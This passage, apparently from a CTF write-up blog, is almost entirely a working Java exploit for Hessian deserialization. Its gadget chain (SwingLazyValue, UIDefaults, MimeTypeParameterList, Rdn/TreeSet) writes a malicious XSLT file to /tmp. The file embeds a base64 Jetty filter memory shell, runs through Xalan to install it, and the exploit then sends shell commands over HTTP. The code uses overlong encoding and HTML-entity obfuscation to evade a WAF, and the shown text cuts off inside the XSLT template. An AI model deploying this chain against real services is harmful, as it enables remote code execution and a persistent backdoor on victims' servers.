class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br>  <br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;  <br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;  <br>  <br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;  <br><span class="hljs-keyword">import</span> sun.reflect.ReflectionFactory;  <br><span class="hljs-keyword">import</span> sun.reflect.misc.MethodUtil;  <br>  <br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;  <br>  <br><span class="hljs-keyword">import</span> javax.activation.MimeTypeParameterList;  <br>  <br><span class="hljs-keyword">import</span> javax.swing.*;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;  <br><span class="hljs-keyword">import</span> java.net.URL;  <br><span class="hljs-keyword">import</span> java.net.URLEncoder;  <br><span class="hljs-keyword">import</span> java.util.Base64;  <br><span class="hljs-keyword">import</span> java.util.TreeMap;  <br><span class="hljs-keyword">import</span> java.util.TreeSet;  <br><span class="hljs-keyword">import</span> java.lang.String;<br><br><br><span class="hljs-comment">/**  </span><br><span class="hljs-comment"> * whatever equals * MultiUIDefaults toString * UIDefaults get * SwingLazyValue createValue * rce */</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> &#123;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">tmpPath</span> <span class="hljs-operator">=</span> isLinux ? <span class="hljs-string">&quot;/tmp/&quot;</span> : <span class="hljs-string">&quot;C:\\Windows\\Temp\\&quot;</span>;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilPath</span> <span class="hljs-operator">=</span> tmpPath + <span class="hljs-string">&quot;evil.xslt&quot;</span>;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\hdhessian\\src\\main\\java\\exp\\eddiemurphy\\template.xslt&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\hdhessian\\JettyFilterMemoryShell.class&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">filterClass</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;F:\\CTF_Java\\hdhessian\\JettyFilter.class&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">targetURL</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;http://127.0.0.1:8082&quot;</span>;<br>    <span class="hljs-keyword">static</span> Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-comment">// read memory shell bytes  </span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(evilClass);  <br>        <span class="hljs-type">byte</span>[] evilBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fis.available()];  <br>        fis.read(evilBytes);  <br>        fis.close();  <br>  <br>        fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filterClass);<br>        <span class="hljs-type">byte</span>[] filterClass = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fis.available()];  <br>        fis.read(filterClass);  <br>        fis.close();  <br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encoder.encode(filterClass)));  <br>  <br>        <span class="hljs-comment">// write evil bytes to template  </span><br>        fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(template);  <br>        <span class="hljs-type">byte</span>[] templateBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[fis.available()];  <br>        fis.read(templateBytes);  <br>        fis.close();  <br>  <br>        <span class="hljs-comment">// base64 encoded classBytes to bypass &#x27;java&#x27; waf  </span><br>        <span class="hljs-type">byte</span>[] evilXSLT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(templateBytes)  <br>                        .replace(<span class="hljs-string">&quot;&lt;payload&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encoder.encode(evilBytes)))  <br>                        .getBytes();  <br>  <br>        <span class="hljs-comment">// define SwingLazyValue payload to send  </span><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">writeFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(  <br>                <span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>,  <br>                <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>                        evilPath,<br>                        evilXSLT<br>                &#125;<br>        );<br>  <br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">execute</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>                MethodUtil.class.getName(),<br>                <span class="hljs-string">&quot;whatever&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>                        MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class),  <br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(),  <br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>                                Runtime.class.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String[].class),  <br>                                Runtime.getRuntime(),  <br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;  <br>                                                isLinux ? <span class="hljs-string">&quot;sh&quot;</span> : <span class="hljs-string">&quot;cmd&quot;</span>,  <br>                                                isLinux ? <span class="hljs-string">&quot;-c&quot;</span> : <span class="hljs-string">&quot;/c&quot;</span>,  <br>                                                <span class="hljs-string">&quot;whatever&quot;</span><br>                                        &#125;  <br>                                &#125;  <br>                        &#125;  <br>                &#125;  <br>        );  <br>  <br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">runXSLT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(  <br>                <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>,  <br>                <span class="hljs-string">&quot;_main&quot;</span>,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, evilPath&#125;&#125;  <br>        );  <br>  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> makePayload(writeFile);<br><span class="hljs-comment">//        Object o2 = makePayload(execute);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o3</span> <span class="hljs-operator">=</span> makePayload(runXSLT);<br>  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> convertPayload(o1);<br><span class="hljs-comment">//        String payload2 = convertPayload(o2);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload3</span> <span class="hljs-operator">=</span> convertPayload(o3);<br>  <br><span class="hljs-comment">//        testObject(payload2);</span><br>  <br>        System.out.println(sendPost(targetURL, <span class="hljs-string">&quot;ser&quot;</span>, payload1));  <br><span class="hljs-comment">//        System.out.println(sendPost(targetURL, &quot;ser&quot;, payload2));  </span><br>        System.out.println(sendPost(targetURL, <span class="hljs-string">&quot;ser&quot;</span>, payload3));  <br>        System.out.println(sendPost(targetURL, <span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>));  <br>  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">convertPayload</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span>(baos);<br>        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);  <br>  <br>        hessian2Output.writeObject(o);  <br>        hessian2Output.flush();  <br>        <span class="hljs-type">byte</span>[] bytes = baos.toByteArray();  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encoder.encode(bytes));  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testObject</span><span class="hljs-params">(String payload)</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BASE64Decoder</span>().decodeBuffer(payload);  <br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);  <br>            <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();  <br>            System.out.println(o);  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            e.printStackTrace();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makePayload</span><span class="hljs-params">(SwingLazyValue swingLazyValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();  <br>        uiDefaults.put(<span class="hljs-string">&quot;test&quot;</span>, swingLazyValue);  <br>  <br>        <span class="hljs-type">MimeTypeParameterList</span> <span class="hljs-variable">mimeTypeParameterList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MimeTypeParameterList</span>();  <br>        setFieldValue(mimeTypeParameterList, <span class="hljs-string">&quot;parameters&quot;</span>, uiDefaults);  <br>  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">typeConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.sound.sampled.AudioFileFormat$Type&quot;</span>).getConstructor(String.class, String.class);  <br>        typeConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> typeConstructor.newInstance(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>        setFieldValue(type, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-literal">null</span>);  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry1</span> <span class="hljs-operator">=</span> newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry2</span> <span class="hljs-operator">=</span> newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);  <br>        setFieldValue(rdnEntry1, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>        setFieldValue(rdnEntry1, <span class="hljs-string">&quot;value&quot;</span>, mimeTypeParameterList);  <br>        setFieldValue(rdnEntry2, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>        setFieldValue(rdnEntry2, <span class="hljs-string">&quot;value&quot;</span>, type);  <br>  <br>        <span class="hljs-comment">// make mimeTypeParameterList before Type  </span><br>        <span class="hljs-type">TreeSet</span> <span class="hljs-variable">treeSet</span> <span class="hljs-operator">=</span> makeTreeSet(rdnEntry1, rdnEntry2);  <br>        <span class="hljs-keyword">return</span> treeSet;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);  <br>            <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>)  <br>                field.setAccessible(<span class="hljs-literal">true</span>);  <br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)  <br>                field = getField(clazz.getSuperclass(), fieldName);  <br>            <span class="hljs-keyword">return</span> field;  <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;  <br>            <span class="hljs-keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;  <br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);  <br>            &#125;  <br>            <span class="hljs-keyword">throw</span> e;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newInstance</span><span class="hljs-params">(String className, Object... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Class&lt;?&gt; clazz = Class.forName(className);  <br>        <span class="hljs-keyword">if</span> (args != <span class="hljs-literal">null</span>) &#123;  <br>            Class&lt;?&gt;[] argTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[args.length];  <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;  <br>                argTypes[i] = args[i].getClass();  <br>            &#125;  <br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(argTypes);  <br>            constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>            <span class="hljs-keyword">return</span> constructor.newInstance(args);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();  <br>            constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>            <span class="hljs-keyword">return</span> constructor.newInstance();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TreeSet <span class="hljs-title function_">makeTreeSet</span><span class="hljs-params">(Object o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">TreeMap</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>();  <br>        setFieldValue(m, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);  <br>        setFieldValue(m, <span class="hljs-string">&quot;modCount&quot;</span>, <span class="hljs-number">2</span>);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">nodeC</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCst</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);  <br>        nodeCst.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCst.newInstance(o1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nodeCst.newInstance(o2, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], node);  <br>        setFieldValue(node, <span class="hljs-string">&quot;right&quot;</span>, right);  <br>        setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);  <br>        <span class="hljs-type">TreeSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>();  <br>        setFieldValue(set, <span class="hljs-string">&quot;m&quot;</span>, m);  <br>        <span class="hljs-keyword">return</span> set;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">joinPath</span><span class="hljs-params">(String... paths)</span> &#123;  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">finalPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  <br>        <span class="hljs-keyword">for</span> (String path : paths) &#123;  <br>            <span class="hljs-keyword">if</span> (isLinux) &#123;  <br>                finalPath.append(<span class="hljs-string">&quot;/&quot;</span>).append(path);  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                finalPath.append(<span class="hljs-string">&quot;\\&quot;</span>).append(path);  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> finalPath.toString();  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sendPost</span><span class="hljs-params">(String urlStr, String paramName, String paramValue)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urlStr);  <br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();  <br>  <br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);  <br>        connection.setDoOutput(<span class="hljs-literal">true</span>);  <br>  <br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);  <br>  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">urlParameters</span> <span class="hljs-operator">=</span> paramName + <span class="hljs-string">&quot;=&quot;</span> + URLEncoder.encode(paramValue, <span class="hljs-string">&quot;UTF-8&quot;</span>);  <br>  <br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(connection.getOutputStream())) &#123;  <br>            out.writeBytes(urlParameters);  <br>            out.flush();  <br>        &#125;  <br>  <br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();  <br>  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  <br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(connection.getInputStream()))) &#123;  <br>            String inputLine;  <br>            <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;  <br>                response.append(inputLine);  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode + <span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;Response: &quot;</span> + response;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- template.xslt è¿™é‡Œçš„java ä½¿ç”¨äº†htmlå®ä½“ç¼–ç  --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>  </span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:sem</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/ja<span class="hljs-symbol">&amp;#x76;</span>a/ja<span class="hljs-symbol">&amp;#x76;</span>ax.script.ScriptEngineManager&quot;</span>                <span class="hljs-attr">xmlns:se</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/ja<span class="hljs-symbol">&amp;#x76;</span>a/ja<span class="hljs-symbol">&amp;#x76;</span>ax.script.ScriptEngine&quot;</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;unsafeClass&quot; select=&quot;ja&amp;#x76;a:ja&amp;#x76;a.lang.Class.forName(&#x27;sun.misc.Unsafe&#x27;)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;theUnsafeField&quot; select=&quot;cl:getDeclaredField($unsafeClass, &#x27;theUnsafe&#x27;)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:&amp;#x76;alue-of select=&quot;filed:setAccessible($theUnsafeField, true())&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;unsafeInstance&quot; select=&quot;filed:get($theUnsafeField, $unsafeClass)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;test&quot; select=&quot;unsafe:staticFieldBase($unsafeInstance,$unsafeClass)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;rce&quot; select=&quot;unsafe:defineClass($unsafeInstance,&#x27;JettyMemoryShell&#x27;,$bs,0,ja&amp;#x76;a:ja&amp;#x76;a.lang.Integer.&amp;#x76;alueOf(ja&amp;#x76;a:ja&amp;#x76;a.lang.reflect.Array.getLength($bs)),$cl,null)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:&amp;#x76;alue-of select=&quot;$rce&quot;/&gt;--&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;engineobject&quot;</span> <span class="hljs-attr">select</span>=<span 